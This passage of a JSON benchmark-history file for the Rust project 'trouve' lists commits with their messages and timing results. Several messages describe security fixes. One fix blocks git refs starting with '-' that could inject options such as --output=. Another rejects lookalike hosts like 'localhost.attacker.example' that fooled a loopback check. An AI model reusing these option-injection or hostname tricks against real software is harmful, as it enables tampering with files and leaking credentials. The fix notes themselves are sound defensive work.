world-readable\nuntil the follow-up chmod) and treated a corrupt file as empty (so the\nnext set() wiped every other credential); create the temp file 0600,\nwrite-then-rename, and surface a parse error instead of silently\ndefaulting.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Validate git refs from the API and pass --end-of-options\n\nbase_ref flows from the HTTP API straight into git as a positional\nargument, so a value starting with '-' would be parsed as an option\n(git diff accepts file-writing flags like --output=). Reject refs that\nare empty or start with '-', and pass --end-of-options before the ref in\ncreate_worktree and session_diff so git can never treat it as a flag.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Preserve a malformed config.toml instead of overwriting it\n\nA TOML parse error made Config::load fall back to Config::default(), and\nthe next persisted settings change rewrote config.toml from that default\nsnapshot, destroying the user's hand-written providers, enterprise hosts,\nand inline api keys. Back the broken file up to <config>.toml.corrupt,\nrun with defaults for the session, and refuse to persist over the file\nuntil the user fixes it.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Verify GGUF downloads against Content-Length and catalog size\n\ndownload_gguf streamed to a .part file and renamed it to final with no\nintegrity check, so a connection dropped mid-download (or a wrong file\nserved from the mutable main ref) produced a truncated/corrupt model that\nwas then loaded. Reject the download when the byte count doesn't match the\nresponse Content-Length, or differs from the curated catalog size by more\nthan 1%.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Close terminal subscribe double-emit and concurrent-open races\n\nTwo terminal races. subscribe() opened its broadcast receiver and then\nsnapshotted the backlog, while the reader appended to the backlog and\nthen broadcast — so a chunk arriving in that window landed in both the\nreplay and the live stream, and since live SSE chunks carry no offset the\nclient couldn't dedup it: the bytes rendered twice and every later offset\nwas skewed (breaking resume). Now the reader broadcasts under the backlog\nlock and subscribe opens its receiver under that same lock, so a chunk is\ndelivered through exactly one path. Also serialize open() so two\nconcurrent opens for one session can't both spawn a shell and leak one.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Clear stale thread state when the open session vanishes; avoid index panics\n\nWhen the current session was deleted elsewhere (another window or an\nautomation), reload_sessions recomputed current_session to None but left\nthreads and current_thread pointing at the gone session, so the chat kept\nrendering it and current_thread_id returned a dead thread. Clear both.\nAlso route current_thread_id and update_current_thread through .get()\ninstead of direct indexing, so a transient threads/current_thread\ndisagreement degrades gracefully instead of panicking.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Coalesce streaming-delta chat renders\n\nEvery AssistantDelta re-folded and re-cloned the whole transcript, so a\nturn's stream cost ~O(n^2) over its length. Throttle delta-driven chat\nre-renders to at most one per 50ms; non-delta events (including the\nfinalized assistant.message and turn.completed) still render immediately,\nso the final token is never left unshown.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Buffer codex notifications that arrive before subscribe\n\nThe codex thread id is only known after thread/start returns, and\nsubscribe happens after that, so any thread-scoped notification the\napp-server emitted in the gap was dropped by the reader (no route yet).\nBuffer notifications for a named-but-unrouted thread and flush them when\nsubscribe registers, so nothing between thread/start and subscribe is\nlost; clear the buffer on unsubscribe.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Bound file reads and guard apply_patch moves\n\nLow-severity robustness in the tool layer: read_file now checks file size\nvia metadata before buffering (rejecting oversized images before the read\nand text files over 32MB up front, since read_to_string ignores\noffset/limit); grep skips files over 8MB so one huge or newline-free file\ncan't spike memory/CPU; and apply_patch's 'Move to' refuses to overwrite\nan existing destination (which also deleted the source) like the Add\nguard already does.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Surface iteration-limit truncation; fix UTF-8 seams in shell output and login parsing\n\nThree low-severity correctness fixes. A turn that exhausts the 32-step\niteration budget mid-task ended silently as if finished; it now appends a\nvisible note (and a transcript line the model sees) so the user knows to\ncontinue. shell_output decoded the incremental byte slice at an arbitrary\noffset, mangling a multi-byte character split across two reads; it now\ndecodes only up to the last complete character and carries the remainder.\nfind_user_code sliced the original line with a byte offset from its\nlowercased copy, which could panic on non-ASCII; it maps through char\nindices instead.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fail PKCE on denial; restrict the Codex responses URL override\n\nThe PKCE callback ignored the error redirect (access_denied), so a user\nwho declined consent hung behind a 'login complete' page until the\n10-minute timeout; detect error= and fail immediately.\nTROUVE_CODEX_RESPONSES_URL redirected the ChatGPT subscription bearer\ntoken to any host via one env var; now non-loopback overrides are refused\nunless TROUVE_ALLOW_REMOTE is set, and any override is logged.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Cap the terminal scrollback partial-line buffer\n\nA process emitting megabytes with no newline (a \\r progress bar or binary\noutput) grew the pending partial line without bound. Force-flush it as a\nrow once it exceeds 64KB.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Doc/cleanup follow-ups for the git-URL removal and crate move\n\n- clear index now also removes the defunct <cache>/clones dir left by\n  1.1-2.0, which no command could otherwise clean up.\n- marketplace.json no longer advertises 'remote git repository' support\n  that the tool now rejects.\n- DIFFERENCES.md notes its module-map paths are relative to the moved\n  crate root; the root Cargo.toml MSRV comment no longer cites the deleted\n  clone cache.\n- spawn_session's tool description reflects that the child is based on the\n  parent's latest checkpoint.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* cargo fmt\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Silence clippy on the new code\n\nDrop a useless .into() in the dispatch_queue error path and allow\ntoo_many_arguments on handle_tool_call (it gained a cancellation token).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Secure Claude MCP temp configs\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Scope Codex MCP approvals per server\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Block session deletion during active turns\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Delete session state before filesystem cleanup\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Keep queued prompts durable through dispatch\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Record automation outcomes after turns finish\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Summarize turns that hit the tool-step limit\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Batch persisted chat event replay\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Percent-encode Unicode query values as UTF-8\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Move chat syntax highlighting off the UI thread\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Coalesce terminal output rendering\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Terminate shell process groups on cleanup\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Raise workspace MSRV to Rust 1.92\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Install Linux native dependencies in CI\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Format remaining workspace sources\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Authenticate the internal MCP bridge\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Satisfy stable Clippy remote parsing lint\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Keep client tests after helper definitions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix workspace rustdoc warnings\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Allow literal protocol model placeholder in docs\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Add scoped automation permission modes\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Update OpenAPI for automation permissions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Read Claude Code subscription usage via the get_usage control request\n\nThe providers settings screen showed 'Anthropic does not provide\nsubscription usage to third-party apps' for Claude Code. It does,\nthrough the same sanctioned stream-json surface the backend already\ndrives: a print-mode process answers a get_usage control request with\nthe data behind the TUI's /usage dialog (plan, 5h/weekly rate-limit\nwindows, extra-usage credits). The /usage slash command itself has no\nheadless equivalent, but this control request is how SDK clients ask\nfor the same snapshot.\n\nClaudeBackend::subscription_health spawns a short-lived\n'claude -p --input-format stream-json --output-format stream-json'\nprocess (no user message, so no model turn or token cost), sends the\ncontrol request, and parses the response into SubscriptionHealth.\nBoth payload shapes are handled: the classic flat buckets (five_hour /\nseven_day / seven_day_sonnet / seven_day_opus, RFC 3339 resets) and\nthe newer self-describing 'limits' array (unix-seconds resets) that\nAnthropic is migrating to, deduped by window label.\n\nThe settings screen now renders up to four meters per provider (Claude\nMax reports three windows; model-scoped weeks can add more), and the\n'vendor does not share this' note is now Cursor-only. format_reset\nmoves to the crate root so codex.rs and claude.rs share it.\n\nVerified against Claude Code v2.1.207: the control request answers in\nunder a second; logged-out installs report rate_limits_available=false\nand surface as 'unavailable' with a login hint.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-15T21:33:53-05:00",
          "tree_id": "83d50440a4bf5aa668654a2f30ffbbe13dde686a",
          "url": "https://github.com/jimsimon/trouve/commit/43a1a7144d9c6fd55da4a6274f970522c74a4106"
        },
        "date": 1784169361800,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 97.56279140000001,
            "range": "± 9.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 56.596479200000005,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 72.6459436,
            "range": "± 112",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 55.195132179999995,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "535ba8a92c4822065cd15153270198895c8a3728",
          "message": "Update Rust crate bytemuck to v1.25.1 (#46)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-16T13:46:47-05:00",
          "tree_id": "e9febd89c0e08058f27790ba658469b137f33750",
          "url": "https://github.com/jimsimon/trouve/commit/535ba8a92c4822065cd15153270198895c8a3728"
        },
        "date": 1784227757823,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.08917141999999,
            "range": "± 258.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.09251190000002,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.88768442000001,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 66.3395722,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "dde35349457fb61a6897187e7f36e5b09ac7965b",
          "message": "Batch semver minor and patch updates into one Renovate PR (#51)\n\nAdd a catch-all package rule (equivalent to the group:allNonMajor preset)\ndeclared last so it takes precedence over the tree-sitter and GitHub\nActions groups for non-major updates; those groups still apply to major\nand digest updates.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T17:26:44-04:00",
          "tree_id": "265dddfd2b0b42c9cab7ff2ed217248290e91f4b",
          "url": "https://github.com/jimsimon/trouve/commit/dde35349457fb61a6897187e7f36e5b09ac7965b"
        },
        "date": 1784237355679,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 127.28705942000002,
            "range": "± 3.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.12356890000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.02380334,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.71711210000001,
            "range": "± 1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "8044d09df6862b62dcd83e84b6932e3c64f87292",
          "message": "Read Cursor subscription usage from the dashboard RPC via the CLI's login (#48)\n\n* Read Cursor subscription usage from the dashboard RPC via the CLI's login\n\nThe Cursor CLI has no usage surface (no subcommand, no ACP method), but\nthe token it stores in auth.json is accepted by the dashboard's\nConnect-RPC endpoint — verified against a real logged-in Ultra account:\naiserver.v1.DashboardService/GetCurrentPeriodUsage returns per-bucket\nincluded-usage percentages (total / API models / Auto), the on-demand\nspend limit in cents, and the billing cycle bounds; GetPlanInfo carries\nthe plan name.\n\nCursorBackend::subscription_health reads the CLI's auth.json (mirroring\nthe CLI's own per-platform path resolution; the token is never\nrefreshed by us — same policy as the direct-Codex provider) and makes\nthe two unary Connect-JSON calls. Windows map to the meters the\nsettings screen already renders (four fit the cap added for Claude):\nincluded total/API/Auto percent plus on-demand spend, all resetting at\nthe billing cycle end (int64 millis-as-string handled). The on-demand\ndollars ride in the credits line. API-key providers (cursor-api) are\nusage-billed with no allowance, so they report 'unsupported' with an\nexplanation instead of querying the dashboard.\n\nLike codex-api, this endpoint is tolerated rather than contracted; the\nsettings-screen description now says Cursor's read is undocumented and\nmay break. The engine's per-vendor fallback note is gone since all\nthree shipped backends now answer for themselves.\n\nTested with unit tests over the real payload shapes, an adapter e2e\ntest against a local HTTP stub asserting both RPC paths and the Bearer\ntoken from auth.json, and an api-key test for the unsupported path.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review feedback on the dashboard usage query\n\n- Cap the whole usage lookup at USAGE_TIMEOUT: the reqwest client\n  timeout is per request, so the optional GetPlanInfo call now gets\n  only the time GetCurrentPeriodUsage left over, degrading to no plan\n  name when the budget is spent instead of stretching to ~2x.\n- Test stub records the request before writing the response, so the\n  client can no longer finish and assert before the recording lands.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T17:29:03-04:00",
          "tree_id": "c4737d027df30ad3fc25666b06693b6ab923eb3a",
          "url": "https://github.com/jimsimon/trouve/commit/8044d09df6862b62dcd83e84b6932e3c64f87292"
        },
        "date": 1784237452492,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 134.35031246,
            "range": "± 4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 74.14193914,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 81.64499878000001,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 71.39290584,
            "range": "± 0.9",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "df291297455e495895baf13dd73de45d176fa3b2",
          "message": "Offline mode: gate prompt entry, keep local models usable, announce recovery (#49)\n\n* Report server connectivity; list only runnable models offline\n\nThe server owns internet reachability (it talks to the model vendors):\nan opt-in probe monitors it, transitions land in the event log as\nserver.connectivity_changed, and ServerInfo.online carries the snapshot.\nWhile offline /v1/models drops remote providers and vendor backends\ninstead of degrading to static fallback catalogs (the lone cursor/default\nentry) — only the local provider and loopback endpoints survive, so\nclients can gate prompt entry on the list being non-empty.\n\nProbing is wired only in the standalone server binary; probe-less\nengines always report online, keeping cargo test offline-safe.\n\nProtocol 0.18 -> 0.19 (additive).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate prompt entry and explain when the server is offline\n\nInstead of silently showing vendor fallback models, the app now reacts\nto the server's connectivity state: an offline banner appears on the\nchat composer, the new-session/new-thread form, and the automations\nscreen. With local models available the pickers stay usable (restricted\nto them by the server-filtered list); with nothing usable all prompt\ninputs — composer, pickers, model knobs, attach/send, queue send-now,\nautomation add/edit/run — are disabled with the reason shown. Recovery\nre-enables everything, refreshes the model list, and shows a transient\nback-online notice.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Detect a lost server connection; auto-respawn the local server\n\nThe offline banner only covers what the server reports about its own\ninternet — it says nothing when the server itself becomes unreachable\n(crashed local child, or the client's network for TROUVE_SERVER_URL\nsetups). The app previously just went quiet with stale data.\n\nThe server-events follow task now doubles as a connection watchdog:\nwhen the stream drops it probes /v1/info; three consecutive failures\nraise a red blocking banner (worded for local vs remote), and the first\nsuccessful probe clears it, refetches the connectivity snapshot (replay\ndrops stale connectivity events, so the offline flag could otherwise\nstick wrong), reloads catalogs/sessions, and shows a transient\nreconnected notice.\n\nFor the locally spawned server, a watcher task owns the child and\nreports its exit; the app respawns it once on the same address/token\n(60s crash-loop guard) and only asks for an app restart when that\nfails.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review feedback on offline mode\n\n- is_loopback_base_url parses the URL authority and requires an exact\n  localhost host or a loopback IP; substring matching also accepted\n  remote hosts like localhost.attacker.example and would have enabled\n  offline prompts against endpoints that still need the internet.\n  build_provider's keyless-local check now shares the same parser.\n  Regression tests cover the hostname-suffix tricks.\n- ServerConnectionLost/Restored revalidate client.info() before\n  applying: the watchdog and child watcher enqueue independently, so a\n  queued transition can be stale and must not unblock a dead server or\n  re-block a recovered one.\n- A respawned server that never becomes ready is killed and reaped\n  instead of lingering unwatched; ownership moves to the child watcher\n  only after readiness.\n- Automations Pause/Resume and Delete gate on !root.blocked like Run\n  now and Edit.\n- DropUpPicker and SearchPicker close their popup when disabled and\n  ignore clicks/Enter inside an already-open popup, so a mid-\n  interaction disconnect can't submit through a stale popup.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Make connectivity blocking authoritative in the command loop\n\nThe UI disabling controls is cosmetic: a command already queued when\nconnectivity flipped (or a click racing the banner) still reached the\nclient. A shared connectivity_blocked() predicate now feeds both the\nbanner gate and an early rejection in handle() for prompt, queue, and\nautomation commands, so the two sides can't disagree.\n\nOn the UI side the queued-prompt panel now disables drag, reorder,\nedit, save, and delete alongside Send now while blocked, and a\nmid-drag or mid-edit connectivity loss drops the drag state and the\nopen editor instead of leaving them stuck.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate composer knob changes behind the connectivity block too\n\nThe mode/model/thinking/context/fast pickers were only UI-disabled\nwhile blocked; a queued command racing the flip could still mutate the\nthread's model and options through update_current_thread. They now sit\nin the same authoritative rejection list as SendMessage and the queue\ncommands. Pickers re-sync from actual thread state on reconnect, so a\nrejected change can't leave them silently drifted.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T18:07:34-04:00",
          "tree_id": "94f1e14456bf8490f3834a93deca40c468b01156",
          "url": "https://github.com/jimsimon/trouve/commit/df291297455e495895baf13dd73de45d176fa3b2"
        },
        "date": 1784239747092,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 126.73487752000001,
            "range": "± 18.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 72.27744544000001,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 80.94189304000001,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 70.82841580000002,
            "range": "± 12.9",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "479651d54acf0500041f4cbc74e51416e28e78a5",
          "message": "Prefer the Skia renderer to fix screen artifacts while typing (#57)\n\nThe default FemtoVG renderer corrupts its glyph atlas on some Linux\ndrivers, flashing garbage across the window whenever text changes\n(typing) or the window repaints (e.g. a desktop notification appearing).\nRequest Skia at startup, fall back to the default selection if it can't\ninitialize, and leave the choice alone when SLINT_BACKEND is set —\nBackendSelector only reads the env var for requirements left unset.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-16T19:27:12-04:00",
          "tree_id": "d6180a19c46aac5cd9b14088f5620cae26de5604",
          "url": "https://github.com/jimsimon/trouve/commit/479651d54acf0500041f4cbc74e51416e28e78a5"
        },
        "date": 1784244581153,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 134.94346622,
            "range": "± 5.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.58929520000001,
            "range": "± 3.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.70967986000001,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.6521817,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c79062285dc0278bc75f97c7220664ab331fea06",
          "message": "Show the OAuth device code in Settings → Integrations (#58)\n\nThe GitHub sign-in button lives in the Integrations section, but the\n\"opening browser — enter code XXXX-XXXX at …\" status the controller\nreports only rendered in the Providers and Agents sections, so the\ndevice code GitHub asks for was never shown. Render settings-status in\nthe Integrations section too.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-16T22:53:16-04:00",
          "tree_id": "738d818da58a0e29a7943c935b19e8a3b7032cf2",
          "url": "https://github.com/jimsimon/trouve/commit/c79062285dc0278bc75f97c7220664ab331fea06"
        },
        "date": 1784256877707,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 101.61812856,
            "range": "± 49.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.208771000000006,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 72.67185218000002,
            "range": "± 12.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 56.11674832,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "32d6ff98eb790a4f765097f08cb2da83d7963436",
          "message": "Embed trouve-server in-process in the desktop app (ADR 0008) (#61)\n\n* Embed trouve-server in-process in the desktop app (ADR 0008)\n\nThe app spawned trouve-server as a child binary, which meant `cargo run\n--bin trouve` ran against a missing or stale sibling binary, dev builds\nneeded a separate `cargo build -p trouve-server`, and the child-process\nmodel could never ship on iOS (no exec). The protocol boundary — the\nload-bearing part of ADR 0002 — never required a process boundary.\n\ntrouve-server now exposes one bootstrap entry point, bind_local(), that\nwires the full local stack and returns the bound address plus the serve\nfuture. The app spawns that future on its runtime with a per-launch\ntoken (ServerSecurity::with_token) and speaks loopback HTTP+SSE exactly\nas before; the dependency graph still enforces invariant 1 because the\napp depends only on trouve-server, never trouve-core. The standalone\nbinary remains (a thin main over bind_local) for hosted/self-hosted\nuse, and TROUVE_SERVER_URL still targets external servers.\n\nDeleted with the child process: sibling-binary lookup and\nTROUVE_SERVER_BIN, the port-reservation race, PR_SET_PDEATHSIG (and the\nlibc dep), kill-on-drop plumbing. The crash-restart logic carries over\nagainst the embedded task. Trade-off (recorded in the ADR): a hard\nserver crash now takes the UI down; panics are contained by the task\nboundary and restarted.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Update docs/adr/0002-protocol-first-client-server-split.md\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n* Fix rustfmt after CodeRabbit auto-fix on controller.rs.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Await embedded server shutdown after readiness failures.\n\nAborting the serve task alone can leave the listener running; join\nbefore returning startup errors or giving up on restart.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-16T23:41:51-04:00",
          "tree_id": "a89f3ca44eaa184abc0466f3737a8aa5b4c6d11f",
          "url": "https://github.com/jimsimon/trouve/commit/32d6ff98eb790a4f765097f08cb2da83d7963436"
        },
        "date": 1784259827996,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 97.43356866,
            "range": "± 18.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 52.83643382,
            "range": "± 2.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 57.916981979999996,
            "range": "± 8.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 73.71819064000002,
            "range": "± 25.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "364b49916ee19ec835672e0d8d187619ea89d30a",
          "message": "Require a path argument to register a workspace on startup. (#62)\n\n* Require a path argument to register a workspace on startup.\n\nAuto-registering CWD caused session worktrees launched from\n~/.local/share/trouve/worktrees/ to appear as separate workspaces.\nUse `trouve .` or `trouve /path/to/repo` to opt in; plain `trouve`\nloads existing workspaces only.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Update crates/trouve-app/src/controller.rs\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\n\n* Apply rustfmt to controller.rs\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-18T02:27:41-04:00",
          "tree_id": "ba1430a5314a12d115c8df78472c717d9f306b74",
          "url": "https://github.com/jimsimon/trouve/commit/364b49916ee19ec835672e0d8d187619ea89d30a"
        },
        "date": 1784356141218,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.9055178,
            "range": "± 4.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.05356352,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 85.78478627999999,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 74.00020834000001,
            "range": "± 1.9",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "07bc80d5b9eb3912e4b51d3f9c702ed4541dafc0",
